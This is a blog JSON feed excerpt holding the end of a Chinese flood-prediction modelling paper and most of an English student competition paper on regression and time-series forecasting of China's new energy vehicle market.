*</strong></em></h2>\n<p>​\t尽管本模型在多个方面表现出色，但仍存在一些不足。首先，各模型训练后计算的各指标系数的相关性并不完全一致，表明在某些参数调整上还有提升空间。其次，尽管模型采用了多种技术手段进行优化，但在实际应用中，模型的泛化能力和鲁棒性仍需进一步验证。</p>\n<h2 id=\"93-模型的推广\"><a class=\"anchor\" href=\"#93-模型的推广\">#</a> <em><strong>*9.3*</strong></em> <em><strong>* 模型的推广 *</strong></em></h2>\n<p>​\t本模型具备广泛的应用前景。首先，本文所建立的模型经过充分训练，可以随时调用和调整选用的指标重新训练，以适应不同的实际需求。其次，针对洪水指标的影响分析和预防措施的提出，对政府、相关部门和公众采取防洪减灾措施具有积极指导意义。此外，本文使用的多元线性回归模型、梯度提升树模型、随机森林算法和 K-means 聚类算法适用于各领域的问题分析与预测，具有很强的通用性和借鉴意义。本文采用的模型性能评估指标和方法，如余弦相似度、均方误差、K 折交叉验证及测试集分数，可以有效评估其他模型的性能，值得推广使用。该模型可以用于洪水风险评估与管理，将洪水风险评估纳入城市发展计划，识别并减轻潜在的洪水危害，指导关键基础设施的建设和维护，以更好应对洪水灾害。利用该模型评估森林砍伐等指标对洪水风险的影响，可以规划再造林项目及其他相关措施以降低洪水风险。最后，该模型为分析其他自然灾害的影响因素提供了思路和指导，能够帮助预测和分析其他自然灾害的发生概率。</p>\n<h1 id=\"十-总结\"><a class=\"anchor\" href=\"#十-总结\">#</a> <em><strong>* 十、*</strong></em><em><strong>* 总结 *</strong></em></h1>\n<p>本文通过对已知条件中的数据进行分析，研究了与洪水发生概率相关的指标，并通过数据集训练模型来预测洪水发生概率。在模型的构建和分析过程中，本文综合运用了多种方法，如相关性分析、多元线性回归、梯度提升树、随机森林和 Bagging 技术等。通过对比各个模型的性能，发现梯度提升树模型在预测洪水发生概率方面表现最佳。此外，本文筛选出森林砍伐、淤积、大坝质量、河流管理、地形排水五个关键指标，并验证了这些指标在预测洪水发生概率中的重要性。本研究不仅为洪水预测提供了有力工具，还提出了切实可行的防洪措施，能够有效降低洪水灾害带来的损失，为相关领域的研究和实际应用提供了宝贵的参考和借鉴。</p>\n<h1 id=\"十一-参考文献\"><a class=\"anchor\" href=\"#十一-参考文献\">#</a> <em><strong>* 十一、*</strong></em><em><strong>* 参考文献 *</strong></em></h1>\n<p>[1] 耿晓君，杨晓茹，李爱花，等。现代化防洪减灾体系中河道治理思路探讨 [J]. 中国水利，2023 (14):11-14.</p>\n<p>[2] 刘影。水利工程对洪水的影响研究 [J]. 水利技术监督，2016,24 (05):15-16.</p>\n<p>[3] 冯燕。气候变化背景下塔里木河流域洪水灾害的经济社会影响及应对 [J]. 环境社会学，2023 (01):83-105+197.</p>\n<p>[4] 原文林，杨逸凡，赵小棚，等。降雨监测与预报技术在防洪减灾中的应用进展 [J/OL]. 人民长江：1-8 [2024-07-06].<span class=\"exturl\" data-url=\"aHR0cDovL2tucy5jbmtpLm5ldC9rY21zL2RldGFpbC80Mi4xMjAyLlRWLjIwMjQwNjA3LjEwMzQuMDA0Lmh0bWw=\">http://kns.cnki.net/kcms/detail/42.1202.TV.20240607.1034.004.html</span>.</p>\n<p>[5] 杨羽菲。中山市防洪减灾思路与对策研究 [J]. 广东水利水电，2023 (10):60-64.</p>\n<p>[6] 刘欣。水利部将全面增强海河流域防洪减灾能力 [N]. 法治日报，2023-08-25 (005).DOI:10.28241/n.cnki.nfzrb.2023.004825.</p>\n",
            "tags": [
                "Hexo",
                "Front Matter",
                "code",
                "recommendation"
            ]
        },
        {
            "id": "https://enjundu.github.io/bit/%E4%BA%9A%E5%A4%AA%E6%95%B0%E6%A8%A1%E2%80%94%E2%80%94%E6%96%B0%E8%83%BD%E6%BA%90%E6%B1%BD%E8%BD%A6/",
            "url": "https://enjundu.github.io/bit/%E4%BA%9A%E5%A4%AA%E6%95%B0%E6%A8%A1%E2%80%94%E2%80%94%E6%96%B0%E8%83%BD%E6%BA%90%E6%B1%BD%E8%BD%A6/",
            "title": "亚太数模——新能源汽车",
            "date_published": "2024-07-04T14:49:23.000Z",
            "content_html": "<h2 id=\"abstract\"><a class=\"anchor\" href=\"#abstract\">#</a> ABSTRACT</h2>\n<p>This study presents a comprehensive analysis of new energy electric vehicles (NEEVs) in China, employing a range of statistical methods and advanced algorithms. Using tools such as MATLAB, SPSS, and Excel, the research systematically addresses several critical questions regarding the development, impact, and future trajectory of NEEVs.</p>\n<ol>\n<li><strong>Development of NEEVs in China</strong>: The study investigates the rapid growth of NEEVs in China, highlighting the influence of technological advancements and supportive government policies. An upward trend in vehicle ownership and market size is revealed, attributed to factors such as government subsidies, carbon emissions, and advancements in battery technology.</li>\n<li><strong>Predictive Modeling</strong>: Predictive models, including multiple regression, ARIMA time series, and random forest algorithms, are employed to forecast the development of NEEVs over the next decade. The models indicate robust growth in sales and market penetration, driven by reduced costs and technological improvements.</li>\n<li><strong>Market Dynamics</strong>: The research delves into the specific factors affecting the NEEV market in China, identifying key contributors such as patent applications, subsidies, and battery capacities. Regression analysis shows a positive relationship between these factors and the growth of NEEV ownership and market size.</li>\n<li><strong>Impact on Traditional Energy Vehicles</strong>: The study assesses the impact of NEEVs on the global traditional energy vehicle industry, indicating a market transition favoring electric vehicles. This shift is driven by technological advancements, economic considerations, and environmental benefits associated with electric vehicles.</li>\n<li><strong>Government and International Policies</strong>: The analysis extends to the effects of international policies on the development of NEEVs in China. Policies from countries like Germany, Japan, and the United States are examined, revealing their influence on China's NEEV market dynamics.</li>\n<li><strong>Ecological Benefits</strong>: The study evaluates the ecological benefits of NEEVs, particularly in urban areas. It highlights significant reductions in carbon emissions when conventional vehicles are replaced with electric ones, underscoring the environmental advantages of NEEV adoption.</li>\n</ol>\n<p>In conclusion, the paper provides a detailed evaluation of the NEEV market in China, offering valuable insights into its development, market dynamics, and future prospects. The findings underscore the importance of NEEVs in fostering environmental sustainability and economic growth.</p>\n<p><strong>Keywords</strong>: New Energy Electric Vehicles, Statistical Analysis, ARIMA, GA-BP Neural Network, Random Forest, Market Trends, Environmental Sustainability.</p>\n<p><em><strong>*Content*</strong></em></p>\n<p><em><strong>*ABSTRACT*</strong></em>\t<em><strong>*1*</strong></em></p>\n<p><em><strong>*Content*</strong></em>\t2</p>\n<p><em><strong>*1.*</strong></em>\t<em><strong>*Introduction*</strong></em>\t3</p>\n<p>1.2 Problem background\t3</p>\n<p>1.3 Restatement of the Problem\t3</p>\n<p>1.4 Our work\t4</p>\n<p><em><strong>*2.*</strong></em>\t<em><strong>*Assumptions and Justifications.*</strong></em>\t6</p>\n<p><em><strong>*3.*</strong></em>\t****Notation****s\t6</p>\n<p><em><strong>*4.*</strong></em>\t<em><strong>*Data Desceiption*</strong></em>\t7</p>\n<p>4.1Data Collection\t7</p>\n<p>4.2 Data Cleaning\t7</p>\n<p><em><strong>*5.Models and solutions*</strong></em>\t8</p>\n<p>5.1 Analyzing the main factors affecting the development of new energy electric vehicles in China\t8</p>\n<p>5.2 Predicting the future development of new energy electric vehicles in China in the next 10 years.\t12</p>\n<p>5.3 Collect data and establish a mathematical model to analyze the impact of new energy electric vehicles on the global traditional energy vehicle industry.\t19</p>\n<p>5.4 Some countries have formulated a series of policies targeted to resist the development of new energy electric vehicles in China. Establish a mathematical model to analyze the effects of these policies on the development of new energy electric vehicles in China.\t23</p>\n<p>5.6 Based on the conclusion of question 5, write an open letter to the citizens to publicize the benefits of new energy electric vehicles and the contributions of the electric vehicle industry in various countries around the world.\t25</p>\n<p><em><strong>*Appendi*</strong></em><em><strong>*x*</strong></em>\t27</p>\n<p>\\1. <strong>Introduction</strong></p>\n<p><strong>1.1</strong> <em><strong>*Problem background*</strong></em></p>\n<p>New energy vehicles refer to vehicles with advanced technical principles, new</p>\n<p>technologies and new structures, which use unconventional vehicle fuel as their power source (unconventional automotive fuels refer to fuels other than gasoline and diesel) and integrate advanced technologies in vehicle power control and drive. New energy vehicles include four major types: hybrid electric vehicles, pure electric vehicles, fuel cell electric vehicles, and other new energy vehicles. As a type of new energy vehicle, new energy electric vehicles have achieved rapid development in recent years due to their properties of low pollution, low energy consumption, and ability to regulate peak electricity consumption. New energy electric vehicles, including electric buses and family electric cars with less than 7 seats, have been popular with consumers and governments around the world.</p>\n<p>Since 2011, the Chinese government has actively promoted the development of new energy electric vehicles and formulated a series of preferential policies. The new energy electric vehicle industry has achieved tremendous development, gradually becoming another Chinese symbol after the “China High Speed Railway”.</p>\n<p><strong>1.2</strong> <em><strong>*Restatement of the Problem*</strong></em></p>\n<p><em><strong>*problem*</strong></em> <em><strong>*1*</strong></em></p>\n<p>Analyze the main factors that affect the development of new energy electric vehicles in China, establish a mathematical model, and describe the impact of these factors on the development of new energy electric vehicles in China.</p>\n<p><em><strong>*problem*</strong></em> <em><strong>*2*</strong></em></p>\n<p>Collect industry development data on China’s new energy electric vehicles, establish a mathematical model to describe and predict the development of China’s new energy electric vehicles in the next 10 years.</p>\n<p><em><strong>*problem*</strong></em> <em><strong>*3*</strong></em></p>\n<p>Collect data and establish a mathematical model to analyze the impact of new energy electric vehicles on the global traditional energy vehicle industry.</p>\n<p><em><strong>*problem*</strong></em> <em><strong>*4*</strong></em></p>\n<p>Some countries have formulated a series of policies targeted to resist the development of new energy electric vehicles in China. Establish a mathematical model to analyze the effects of these policies on the development of new energy electric vehicles in China.2</p>\n<p><em><strong>*problem*</strong></em> <em><strong>*5*</strong></em></p>\n<p>Analyze the impact of the electrification of new energy electric vehicles (including electric buses) in cities on the ecological environment. Assuming that there is an urban population of 1 million, provide the calculation results of the model.</p>\n<p><em><strong>*problem*</strong></em> <em><strong>*6*</strong></em></p>\n<p>Based on the conclusion of question 5, write an open letter to the citizens to publicize the benefits of new energy electric vehicles and the contributions of the electric vehicle industry in various countries around the world.</p>\n<p><strong>1.3</strong> <em><strong>*Our work*</strong></em></p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/UbNpk4d2zYBxO1s.png\" alt=\"image.png\" /></p>\n<p><strong>1.1.1</strong> <em><strong>*problem 1*</strong></em></p>\n<p>In analyzing China's new energy electric vehicles, we identified key factors like vehicle ownership and market size as dependent variables and included patent applications, subsidies, carbon emissions, battery capacities, vehicle price, and market penetration as independent variables. Our regression analysis showed an upward trend in vehicle ownership, suggesting a positive development in the sector. We addressed variable collinearity and established a robust model, highlighting the significant relationship between vehicle ownership, yearly changes, patent applications, and subsidy amounts.</p>\n<p><strong>1.1.2</strong> <em><strong>*Problem 2*</strong></em></p>\n<p>Our study predicts a bright future for China's new energy vehicles, with sales trends showing considerable growth since 2013. Using a multiple linear regression model based on 19 independent variables, we forecasted the sector's growth for the next decade. The model exhibited an excellent fit, accurately mirroring the actual sales trends and projecting a continued rise in new energy vehicle sales.</p>\n<p><strong>1.1.3</strong> <em><strong>*Problem 3*</strong></em></p>\n<p>Our research involved extensive data preparation and exploratory analysis to understand the impact of electric vehicles on the traditional energy vehicle industry. By employing time series, scatter plots, and correlation matrices, we established a VAR model to analyze the dynamic relationship between electric and traditional vehicle sales. The results indicated a significant influence of electric vehicle growth on the traditional vehicle market, informing policy implications and future industry trends.</p>\n<p><strong>1.1.4</strong> <em><strong>*Problem 4*</strong></em></p>\n<p>This section assessed how international policies like Germany and Japan's opposition, the US Inflation Reduction Act, and the EU's investigation into Chinese electric vehicles affected China's market. Our analysis, based on export data and policy impacts in 2022 and 2023, revealed that these policies have somewhat hindered the growth of China's new energy vehicle exports.</p>\n<p><strong>1.1.5</strong> <em><strong>*Problem 5*</strong></em></p>\n<p>Our study evaluated the ecological benefits of electrifying vehicles in urban areas. By comparing carbon emissions from traditional and electric vehicles, we concluded that a complete switch to electric vehicles could drastically reduce carbon emissions in a city of one million people, emphasizing the environmental advantages of electric vehicle adoption.</p>\n<p><strong>1.1.6</strong> <em><strong>*Problem 6*</strong></em></p>\n<p>In an open letter to citizens, we highlighted the significant role of new energy electric vehicles in achieving a sustainable future. The letter underlined the environmental and technological benefits of electric vehicles, noting advancements in battery technology and smart systems. We encouraged public recognition of these benefits and the positive future outlook for the electric vehicle industry.</p>\n<p>\\1. <strong>Assumptions and Justifications</strong>**.**</p>\n<p><strong>A****ssumption 1:</strong> It is assumed that the data in each form is real and valid, and the sampling error is small. Only when the model is built on real data can reliable prediction results be obtained.</p>\n<p><strong>A****ssumption 2:</strong> It is assumed that the influence of other factors such as Consumer Acceptance is not considered. The model selects some factors that have a greater impact on vehicle ownership, vehicle market size and etc. as independent variables. Only by ignoring the influence of other factors can be reasonable prediction equation be obtained.</p>\n<p><strong>A****ssumption 3</strong>: It is assumed that the data obtained from the search has a certain degree of credibility and rationality. And the data is relatively complete.</p>\n<p>\\2. <strong>Notations</strong></p>\n<p><strong>Table</strong> <strong>1</strong> <strong>Symbol</strong> <strong>Description</strong></p>\n<table>\n<thead>\n<tr>\n<th><em><strong>*Symbol*</strong></em></th>\n<th><em><strong>*Explanation*</strong></em></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><em><strong>*β*</strong></em></td>\n<td>the coefficient of x</td>\n</tr>\n<tr>\n<td><em><strong>*X*</strong></em><em><strong>*Y*</strong></em></td>\n<td>self variantimplicit variant</td>\n</tr>\n</tbody>\n</table>\n<p>\\3. <strong>Data Desceiption</strong></p>\n<p><em><strong>*4.1Data Collection*</strong></em></p>\n<p>Due to the fact that the mathematical modeling problem in this study is related to the development of new energy vehicles, in order to collect datasets related to the development of new energy vehicles, we searched many databases. The data in these databases are all related to new energy vehicles, and due to the different types of data provided by different databases, we integrated the data on an annual basis into a table. Below are the sources of the data and the meanings of variables.</p>\n<p><em><strong>*Table 2 Dataset source*</strong></em></p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/CnsZD9HIi3qmerM.png\" alt=\"image.png\" /></p>\n<p><em><strong>*4.2 Data Cleaning*</strong></em></p>\n<p><em><strong>*4.2.1 Data missing value processing*</strong></em></p>\n<p>Due to the different departments and cycles of data recording, the amount of data in different data sets is not the same. In order to make the data sets of each variable available, the missing values in the data sets should be dealt with accordingly. In this paper, the regression interpolation method based on the serial trend is used to deal with the missing values of the data.</p>\n<p><em><strong>*4.2.2 Data Standardization processing*</strong></em></p>\n<p>Since each variable has different units and orders of magnitude, we standardize each data in order to facilitate the construction of our multiple regression model. In this paper, z-scores are used to process the data. It can be expressed by the following equation:</p>\n<p>*z=(x-μ)/*<em>σ</em>\t\t\t\t\t\t\t\t\t（1）</p>\n<p><em><strong>*4.2.3 Factor correlation analysis chart*</strong></em></p>\n<p>According to the following correlation coefficient heatmap, it can be seen that when New energy vehicle ownership (10000 vehicles) and New Energy Vehicle Market Size (RMB bill) are used as dependent variables, their values are related to Year, Number of patient applications for new energy vehicles (items), Amount of subsidiaries for new energy vehicles (RMB bill), Total carbon emissions (miles of tons) Lithium iron phosphate power battery installed capacity/GWh, installed capacity of term battery/GWh, and weighted average price of new energy vehicles ($10000) are all related. And the correlation coefficients are relatively large (greater than 0.8 and mostly 0.95-1)</p>\n<p>Therefore, the quantities we collected all have strong correlation, and they can all be used as independent variables to predict the sales or development of new energy vehicles.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/M3q9CDOzgfIFwJN.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture2 Correlation coefficient heat map*</strong></em></p>\n<p><strong>5.Models and solutions</strong></p>\n<p><em><strong>*5.1 Analyzing the main factors affecting the development of new energy electric vehicles in China*</strong></em></p>\n<p><em><strong>*（1）Data collection*</strong></em></p>\n<p>We organize the collected data and set Year as an irrelevant variable, but changes in Year will affect the subsequent changes, so we keep Year. then we set New energy vehicle ownership (10,000 vehicles) and New Energy Vehicle Market Size (RMB billion) as dependent variables because our group believes that changes in these two variables can reflect changes in the development of new energy electric vehicles in China. Then we set Number of patent applications for new energy vehicles (items), Amount of subsidies for new energy vehicles (RMB billion), Total carbon emissions ( millions of tons), Lithium iron phosphate power battery installed capacity/GWh, Installed capacity of ternary battery/GWh, Weighted average price of new energy vehicles ($10,000), New energy vehicle market penetration (%) are set as independent variables, considering that they are the main factors affecting the change of the dependent variable.</p>\n<p>Therefore, we design the statistical graph as shown below.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/f4hN28J9a1mEk6X.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture3 Statistical data on factors affecting the development of new energy vehicles*</strong></em></p>\n<p><strong>（2）</strong><em><strong>*New energy vehicle ownership (10,000 vehicles) multiple regression curve*</strong></em></p>\n<p>According to the change of New energy vehicle ownership (10,000 vehicles) and its first-order difference curve over the years, it can be seen that New energy vehicle ownership (10,000 vehicles) shows an upward trend, so the factors in the multivariate regression curve of New energy vehicle ownership (10,000 vehicles) should generally show an upward trend after weighting. Therefore, the factors in the multiple regression curve of New energy vehicle ownership (10,000 vehicles) should be in an upward trend after weighting in general. And we can also know that the curve of New energy vehicle ownership (10,000 vehicles) is accelerating in general.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/waLd5vgBN1xM4pt.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture4 Vehicle ownership and its first-order difference curve vary with year*</strong></em></p>\n<p>The analysis of the results of the F-test shows that the P-value of significance is 0.001 * * *, which is significant at the level and rejects the null hypothesis of a regression coefficient of 0. Therefore, the model basically meets the requirements.</p>\n<p>For the collinearity performance of variables, the VIF values of Year, Number of patent applications for new energy vehicles (items), Amount of subsidiaries for new energy vehicles (RMB bill), Total carbon emissions (miles of tons), Lithium iron phase power battery installed capacity/GWh, Installed capacity of term battery/GWh, Weighted average price of new energy vehicles ($10000) are greater than 10, There is a collinear relationship, so it is easy to remove the collinear independent variables or perform ridge regression or stepwise regression.</p>\n<p>The formula of the model is as follows: y=-0.046-0.507 * Year -0.155 * Number of patient applications for new energy vehicles (items)+1.81 * Amount of subsidiaries for new energy vehicles (RMB bill)+0.028 * Total carbon emissions (miles of tons) -0.556 * Lithium iron phase power battery installed capacity/GWh+1.402 * Installed capacity of term battery/GWh+44.817 * Weighted average price of new energy vehicles ($10000).</p>\n<p>This also confirms that the fit is very good.</p>\n<p><strong>Table3 Table of results of linear regression analysis</strong></p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/eT6WKdN4sLfBkYz.png\" alt=\"image.png\" /></p>\n<p New=\"\" energy=\"\" vehicle=\"\" ownership=\"\" (10000=\"\" vehicles)=\"\">The following figure shows the independent variables X: {Year, Number of patient applications for new energy vehicles (items), Amount of subsidiaries for new energy vehicles (RMB bill), Total carbon emissions (miles of tons), Lithium iron phase power battery installed capacity/GWh, Installed capacity of term battery/GWh, Weighted average price of new energy vehicles ($10000)}; The relationship between the dependent variable Y:</p>\n<p>We order:</p>\n<p>y=New energy vehicle ownership (10,000 vehicles)</p>\n<p><em>x</em>1=Year</p>\n<p><em>x</em>2=Number of patent applications for new energy vehicles (items)</p>\n<p><em>x</em>3=Amount of subsidies for new energy vehicles (RMB billion)</p>\n<p><em>x</em>4=Total carbon emissions (millions of tons)</p>\n<p><em>x</em>5=Lithium iron phosphate power battery installed capacity/GWh</p>\n<p><em>x</em>6=Installed capacity of ternary battery/GWh</p>\n<p><em>x</em>7=Weighted average price of new energy vehicles ($10,000)</p>\n<p>According to the statistics listed above,we could get this function：</p>\n<p>y=-0.046-0.507<em>x</em>1-0.155<em>x</em>2+1.81<em>x</em>3+0.028<em>x</em>4-0.556<em>x</em>5+1.402<em>x</em>6+44.817<em>x</em>7（2）</p>\n<p><strong>Table4 multivariate regression coefficient value</strong></p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/Sa6Z4jpmUWsYM21.png\" alt=\"image.png\" /></p>\n<p>The following graph shows the raw data plot, model fitted values, and model predicted values for this model.</p>\n<p>According to the graph, the fit is very good.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/oG1wCaSuvhMyKEj.png\" alt=\"image.png\" /></p>\n<p><strong>Picture5 Comparison of model fit and true value</strong></p>\n<p>Based on the resultant fit we know that the predicted value of New energy vehicle ownership (10,000 vehicles) is very close to the true value and the fit is successful.</p>\n<p><strong>（3）</strong><em><strong>*New Energy Vehicle Market Size (RMB billion) multiple regression curve*</strong></em></p>\n<p><em><strong>*In the same way as above, we can obtain a set of equations：*</strong></em></p>\n<p>New Energy Vehicle Market Size (RMB billion)=-0.569-6.291（Year）-1.893*（Number of patent applications for new energy vehicles (items)）+28.455*（Amount of subsidies for new energy vehicles (RMB billion)）+0.344（Total carbon emissions (millions of tons)）-5.866*（Lithium iron phosphate power battery installed capacity/GWh）+16.201*（Installed capacity of ternary battery/GWh）+559.405*（Weighted average price of new energy vehicles ($10,000)）</p>\n<p><strong>（4）</strong><em><strong>*Analyzing and summarizing the first question*</strong></em></p>\n<p>In general, government subsidies, total carbon emissions, installed capacity of ternary batteries, and the weighted average price of new energy vehicles have a positive impact on the market size, while the number of patent applications and the installed capacity of lithium iron phosphate power batteries have a negative impact.</p>\n<p>However, from my perspective, an increase in the number of patent applications may signify the growing applicability of patents to new energy vehicles. Additionally, as the development of lithium iron phosphate power batteries matures, it is likely to have a positive impact on the market size. We recognize that during the initial stages of technological development, significant investments are required, and any short-term negative impacts may be inconsequential. Following our group research, a consensus has emerged that these factors will likely contribute positively to the new energy vehicle market in the future.</p>\n<p>Therefore, it is conceivable that a higher number of patent applications could reflect increased technological relevance to new energy vehicles, and the mature development of lithium iron phosphate power batteries may eventually contribute positively to the market size. As our group collectively believes, these factors are expected to benefit the new energy vehicle market substantially in the future.</p>\n<p><em><strong>*5.2 Predicting the future development of new energy electric vehicles in China in the next 10 years.*</strong></em></p>\n<p>(1)<em><strong>*Preliminary trend of increase/decrease based on sales graphs*</strong></em></p>\n<p>The sales of new energy vehicles year by year according to the year - sales plotted as the following curve, from which we can see that the sales of new energy vehicles and the year between the year does have a rising trend, and we can see that the sales of new energy vehicles in the initial emergence of the trend of low-frequency slow growth in about 2013, and in 2020 after the trend of high rate of growth, the analysis of the world's new energy science and technology and the Chinese government's new energy vehicle policy support and other factors, to be discussed in the follow-up.<img data-src=\"https://s2.loli.net/2024/07/04/nysUCTQd6HGLNzp.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture6 Year vs. graph Production and sales of new energy vehicles (10,000 units)*</strong></em></p>\n<p>After the sales of new energy vehicles are processed by the first-order difference, the obtained first-order difference-year graph shows an exponential growth trend, which generally shows a relatively smooth first and a rapid growth trend until the beginning of 2020. Overall it is still in the form of growth.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/aBuoMKwGljnqWkF.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture*</strong></em><em><strong>*7 first-order difference in value Production and sales of new energy vehicles*</strong></em></p>\n<p><strong>(2)</strong> <em><strong>*Modeling based on multiple regression linear curves*</strong></em></p>\n<p>(3) Combining examples and research, we can find that the change of annual sales of new energy vehicles is related to Year、New energy vehicle ownership (10,000 vehicles)、New Energy Vehicle Market Size (RMB billion)、New energy vehicle market penetration (%)、New Energy Vehicle YoY Growth Rate (%)、Number of new energy vehicle enterprises (number)、Number of patent applications for new energy vehicles (items)、Scale of new energy vehicle industry chain (home)、Number of charging piles for new energy vehicles (10,000)、Coverage of new energy vehicle charging infrastructure (%)、Amount of subsidies for new energy vehicles (RMB billion)、Market penetration of conventional fuel vehicles (%)、Total carbon emissions in the Yangtze River Delta region (million tons)、Production and sales of conventional vehicles (10,000 units)、Conventional Vehicles YoY Growth Rate (%)、Lithium iron phosphate power battery installed capacity/GWh、Installed capacity of ternary battery/GWh、Total carbon emissions (millions of tons)、Weighted average price of new energy vehicles ($10,000)and other variable factors are closely related.</p>\n<p>Therefore, we will model the relationship between Production and sales of new energy vehicles (10,000 units) and the other 19 independent variables based on the collected dataset.And the model's conclusions are used to predict the development of new energy electric vehicles in China over the next decade.</p>\n<p>​\t⚫ Build multiple linear models</p>\n<p>We order:</p>\n<p><em>x</em>1=Year</p>\n<p><em>x</em>2=New energy vehicle ownership (10,000 vehicles)</p>\n<p><em>x</em>3=New Energy Vehicle Market Size (RMB billion)</p>\n<p><em>x</em>4=New energy vehicle market penetration (%)</p>\n<p><em>x</em>5=New Energy Vehicle YoY Growth Rate (%)</p>\n<p><em>x</em>6=Number of new energy vehicle enterprises (number)</p>\n<p><em>x</em>7=Number of patent applications for new energy vehicles (items)</p>\n<p><em>x</em>8=Scale of new energy vehicle industry chain (home)</p>\n<p><em>x</em>9=Number of charging piles for new energy vehicles (10,000)</p>\n<p><em>x</em>10=Coverage of new energy vehicle charging infrastructure (%)</p>\n<p><em>x</em>11=Amount of subsidies for new energy vehicles (RMB billion)</p>\n<p><em>x</em>12=Market penetration of conventional fuel vehicles (%)</p>\n<p><em>x</em>13=Total carbon emissions in the Yangtze River Delta region (million tons)</p>\n<p><em>x</em>14=Production and sales of conventional vehicles (10,000 units)</p>\n<p><em>x</em>15=Conventional Vehicles YoY Growth Rate (%)</p>\n<p><em>x</em>16=Lithium iron phosphate power battery installed capacity/GWh</p>\n<p><em>x</em>17=Installed capacity of ternary battery/GWh</p>\n<p><em>x</em>18=Total carbon emissions (millions of tons)</p>\n<p><em>x</em>19=Weighted average price of new energy vehicles ($10,000)</p>\n<p>y=β0+β1<em>x</em>1+β2<em>x</em>2+β3<em>x</em>3+β4<em>x</em>4+β5<em>x</em>5+β6<em>x</em>6+β7<em>x</em>7+β8<em>x</em>8+β9<em>x</em>9+β10<em>x</em>10+β11<em>x</em>11+β12<em>x</em>12+β13<em>x</em>13+β14<em>x</em>14+β15<em>x</em>15+β16<em>x</em>16+β17<em>x</em>17+β18<em>x</em>18+β19<em>x</em>19 \t\t\t\t\t\t\t\t\t\t\t\t<strong>(<strong><strong>3</strong></strong>)</strong></p>\n<p>Using the python code for the multiple regression algorithm (Appendix 1), we can get the value of this multiple regression equation as:</p>\n<p>y=-175.361921+0.786334<em>x</em>1+4.674333<em>x</em>2+0.133171<em>x</em>3+1.340155<em>x</em>4+0.203066<em>x</em>5+5.114536<em>x</em>6-1.460884<em>x</em>7+0.602279<em>x</em>8+2.367206<em>x</em>9-7.039104<em>x</em>10+7.524213<em>x</em>11-1.340155<em>x</em>12-0.623688<em>x</em>13+0.488335<em>x</em>14-6.786688<em>x</em>15-2.279974<em>x</em>16+5.143792<em>x</em>17-0.075757<em>x</em>18+0.393167<em>x</em>19\t\t\t\t\t\t\t\t\t\t\t\t\t\t  <strong>(<strong><strong>4</strong></strong>)</strong></p>\n<p>​</p>\n<p><strong>Table****5</strong> <strong>Model</strong> <strong>Summary</strong></p>\n<table>\n<thead>\n<tr>\n<th>Model</th>\n<th>R</th>\n<th>R square</th>\n<th>Adjust R square</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td></td>\n<td>0.930</td>\n<td>0.865</td>\n<td>0.980</td>\n</tr>\n</tbody>\n</table>\n<p>According to the multiple regression model it is shown that the model R is 0.930, the square of R is 0.865 and the adjusted R square value is 0.980, which indicates a very good fit.</p>\n<p>Hypothesis is raised in F-test: all coefficients are 0. From the ANOVA table (see appendix), it can be seen that the p value of the F test is &lt;0.001, and the null hypothesis is rejected at the significance level of 0.05, and the test is passed.</p>\n<p>We substituted formulas to calculate projected annual sales based on the values of the other nineteen formulas (the algorithm is attached in the Appendix), and then calculated a graph of year-annual sales - projected sales as follows.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/OjX4MycbRzuod8W.png\" alt=\"image.png\" /></p>\n<p><em><strong>*picture8 imagery of year-annual sales - projected sales*</strong></em></p>\n<p>From the above figure, we can find that the number of expected annual sales and the actual number of annual sales is really too close, leading to the fact that we may wonder whether there is a second line drawn, so we do not put a different way of thinking, to make the number of expected annual sales - the actual number of annual sales of the x-y curve, we can clearly see that the slope of the image k = 1, and the intercept is only -0.0046, which is very small, so you can approximate that the predicted results are exactly the same as the actual results. The fit is valid.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/W7yidw4JYGRtPUK.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture9 Forecasted - Actuall Number of units sold*</strong></em></p>\n<p>From the graph I gave and the formula new energy vehicle production and sales (10,000 units) = -175.361921 + 0.786334 × year + 4.674333 × new energy vehicle ownership (10,000 units) + 0.133171 × new energy vehicle market size (100 million yuan) + 1.340155 × new energy vehicle market penetration rate (%) + 0.203066 × new energy vehicle vehicle chain growth rate (%) +5.114536×number of new energy vehicle enterprises (home) +-1.460884×number of new energy vehicle patent applications (item) +0.602279×size of new energy vehicle industry chain (home) +2.367206×number of new energy vehicle charging piles (10,000 pcs) +-7.039104×coverage of new energy vehicle charging infrastructure ( %) + 7.524213 × amount of subsidies for new energy vehicles (RMB 100 million) + -1.340155 × market penetration rate of traditional fuel vehicles (%) + -0.623688 × total carbon emissions in the Yangtze River Delta region (millions of tons) + 0.488335 × production and sales volume of traditional vehicles (10,000 vehicles) + -6.786688 × chain growth rate of traditional vehicles (%) + - 2.279974×Lithium iron phosphate power battery installed volume/GWh+5.143792×Ternary battery installed volume/GWh+- can be known.</p>\n<p>\\1. New energy vehicle production and sales (10,000 units) and year, new energy vehicle ownership (10,000 units), new energy vehicle market size (RMB 100 million), new energy vehicle market penetration rate (%), new energy vehicle chain growth rate (%), number of new energy vehicle enterprises (home), new energy vehicle industry chain size (home) new energy vehicle industry chain size (home), number of new energy vehicle charging piles (10,000) The independent variables of new energy vehicle subsidy amount (RMB 100 million), installed capacity of ternary batteries/GWh, and weighted average price of new energy vehicles (RMB 10,000) are positively correlated.</p>\n<p>\\2. Negative correlation with total carbon emissions (million tons), chain growth rate of conventional vehicles (%), etc.</p>\n<p>From the following change curves of the respective variables, it can be seen that the total sales volume of new energy vehicles (10,000 units) will grow exponentially in the next ten years.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/BwtxHlyNRXcsh3g.png\" alt=\"image.png\" 